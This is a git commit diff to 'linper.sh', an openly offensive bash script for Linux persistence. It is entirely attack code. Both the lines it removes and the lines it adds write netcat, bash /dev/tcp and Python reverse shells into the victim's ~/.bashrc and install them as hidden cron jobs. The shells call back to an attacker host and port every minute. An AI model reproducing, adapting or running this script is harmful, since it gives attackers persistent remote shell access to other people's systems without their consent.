f1b079dd90871496707e42af0e424e39d9344e79
montyonsecurity <jacobcainmontgomery@gmail.com>
2019-11-04 22:11:52 -0500

    python support and smarter persistance placement with if conditions

--- linper.sh
+++ linper.sh
@@ -1,41 +1,36 @@
 #!/bin/bash
 
-attackBox=192.168.56.12
+attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
 
-touch ~/.bashrc &&
-echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc && 
-echo "[+] Netcat reverse shell placed in $HOME/.bashrc"
-sleep 2
+if $(env | grep -qi HOME);
+then
 
-echo "echo 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1 | bash' | sh 2> /dev/null & sleep .0001" >> ~/.bashrc
-echo "[+] Bash reverse shell placed in $HOME/.bashrc"
-sleep 2
+	touch ~/.bashrc
+	echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
+	if $(cat ~/.bashrc | grep $attackBox | grep -qi $attackPort);
+	then
+		echo "[+] Netcat reverse shell placed in $HOME/.bashrc"
+		echo "[+] Calls back to $attackBox:$attackPort"
+	fi
 
-echo "echo 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1 | bash' | sh" > /var/tmp/.cron.sh &&
-chmod +x /var/tmp/.cron.sh &&
-echo "$cron cd /var/tmp && ./.cron.sh" > cronjobtmp.sh &&
-crontab cronjobtmp.sh &&
-echo "[+] Bash reverse shell (/var/tmp/.cron.sh) set on a cron"
-rm cronjobtmp.sh
-sleep 2
+	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
+	if $(cat ~/.bashrc | grep $attackBox | grep -qi "python");
+	then
+		echo "[+] Python reverse shell placed in $HOME/.bashrc"
+		echo "[+] Calls back to $attackBox:$attackPort"
+	fi
+fi
 
+if $(which python | grep -qi "python");
+then
+	echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /dev/shm/.cron.sh
+	crontab /dev/shm/.cron.sh
+	rm /dev/shm/.cron.sh
 
-echo "nc $attackBox $attackPort" > /var/tmp/.cron2.sh &&
-chmod +x /var/tmp/.cron2.sh &&
-echo "$cron cd /var/tmp && ./.cron2.sh" > cronjobtmp.sh && 
-crontab cronjobtmp.sh &&
-echo "[+] Netcat reverse shell (/var/tmp/.cron2.sh) set on a cron"
-rm cronjobtmp.sh
-
-echo "nc -lnvp $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc && 
-echo "[+] Netcat bind shell placed in $HOME/.bashrc"
-sleep 2
-
-echo "nc -lnvp  $attackPort -e /bin/bash 2> /dev/null & sleep .0001" > /var/tmp/.cron3.sh &&
-chmod +x /var/tmp/.cron3.sh &&
-echo "$cron cd /var/tmp && ./.cron3.sh" > cronjobtmp.sh && 
-crontab cronjobtmp.sh &&
-echo "[+] Netcat bind shell (/var/tmp/.cron3.sh) set on a cron"
-rm cronjobtmp.sh
+	if $(crontab -l | grep "python" | grep -qi $attackBox);
+	then
+		echo "[+] Python reverse shell written to $USER's crontab"
+	fi
+fi
